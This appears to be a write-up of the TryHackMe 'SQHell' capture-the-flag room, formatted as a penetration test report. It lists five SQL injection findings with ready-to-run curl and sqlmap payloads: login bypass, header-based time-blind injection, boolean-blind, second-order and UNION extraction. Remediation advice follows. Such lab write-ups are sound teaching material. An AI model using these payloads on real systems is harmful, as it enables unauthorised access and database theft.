SQHell — Penetration Test Disclosure Report

TryHackMe Medium · 2026-07-08

Target: 10.65.137.112 Assessment Date: 2026-07-08 Classification: CONFIDENTIAL

1. Executive Summary

A penetration test was conducted against the SQHell web application (10.65.137.112). The application runs on Ubuntu Linux with nginx 1.18.0 and exposes SSH (port 22) and HTTP (port 80). Five distinct SQL injection vulnerabilities were identified and exploited across four different endpoints and one HTTP header, each accessing separate backend databases (sqhell_1 through sqhell_5). All five flags were recovered, demonstrating authentication bypass, data extraction via UNION queries, boolean-based blind injection, time-based blind injection via the X-Forwarded-For header, and a second-order SQL injection.

5. Detailed Findings

F-01: SQL Injection in Login Form (Auth Bypass)

Severity: Critical (CVSSv3: 9.8) Affected Component: POST /login, username parameter

Description: The login form accepts unsanitized user input directly in SQL queries. Supplying the payload admin' OR 1=1-- in the username field bypasses authentication entirely and displays Flag 1.

Steps to Reproduce:

curl -s "http://10.65.137.112/login" -d "username=admin' OR 1=1-- &password=test"

Impact: An attacker can bypass authentication without valid credentials, gaining access to restricted application areas.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — network-exploitable, no privileges required, no user interaction, full compromise.

F-02: SQL Injection in X-Forwarded-For Header

Severity: Critical (CVSSv3: 9.1) Affected Component: GET /user?id=1, X-Forwarded-For HTTP header

Description: The application logs visitor IP addresses via the X-Forwarded-For header without sanitization, inserting it directly into a SQL query against the sqhell_1 database. Time-based blind injection extracts Flag 2.

Steps to Reproduce:

sqlmap -u "http://10.65.137.112/user?id=1" --headers="X-Forwarded-For: 1*" --level 5 --risk 3 -D sqhell_1 -T flag --dump --time-sec 1

Impact: An attacker can extract the full contents of the sqhell_1 database, including the flag table.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — no privileges required, full database read with potential write via stacked queries.

F-03: Blind SQL Injection in Username Check Endpoint

Severity: High (CVSSv3: 7.5) Affected Component: GET /register/user-check?username=

Description: The AJAX username availability check endpoint is vulnerable to boolean-based blind SQL injection against the sqhell_3 database. The response {"available":true/false} serves as an oracle.

Steps to Reproduce:

# True condition:
curl "http://10.65.137.112/register/user-check?username=' OR 1=1-- "
# Returns: {"available":false}

# False condition:
curl "http://10.65.137.112/register/user-check?username=' OR 1=2-- "
# Returns: {"available":true}

Impact: Blind extraction of all database contents, including the flag table.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — full read access, no write or denial-of-service.

F-04: Second-Order SQL Injection in User Profile

Severity: High (CVSSv3: 8.6) Affected Component: GET /user?id=

Description: The user profile endpoint returns user data via a first SQL query against sqhell_4. The id column from the first query's result is then unsanitized in a second query against sqhell_5 to fetch the user's posts. A crafted UNION payload in the first query injects into the second query.

Steps to Reproduce:

curl -s "http://10.65.137.112/user?id=0 UNION SELECT '1 UNION SELECT flag,flag,flag,flag FROM flag-- -',2,3 FROM users-- -"
# Flag 4 appears in the post links on the page.

Impact: An attacker can execute arbitrary SQL in the second query context (sqhell_5), extracting the flag table.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — full database read/write in the second query context.

F-05: UNION-Based SQL Injection in Blog Post Parameter

Severity: High (CVSSv3: 7.5) Affected Component: GET /post?id=

Description: The blog post viewer takes an id parameter directly into a SQL query without sanitization. A UNION SELECT with 4 columns extracts data from the sqhell_5.flag table.

Steps to Reproduce:

curl -s "http://10.65.137.112/post?id=0 UNION SELECT 1,group_concat(flag),3,4 FROM flag"

Impact: Direct extraction of the flag table contents.

CVSS Justification: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — read-only, no authentication required.

6. Remediation Recommendations

  1. F-01, F-05: Use parameterized queries (prepared statements) for all database interactions.
  2. F-02: Sanitize all HTTP header values before database insertion; prefer parameterized queries for logged data.
  3. F-03: Replace string concatenation in SQL with prepared statements in the username-check handler.
  4. F-04: Ensure results from a first query are cast to expected types (e.g., intval()) before use in subsequent queries.
  5. F-01 through F-05: Apply strict input validation (allow-lists for numeric IDs, length limits for strings).
  6. All: Implement a Web Application Firewall (WAF) as a defense-in-depth layer.
  7. All: Grant least-privilege database permissions — each application function should only access its required tables.
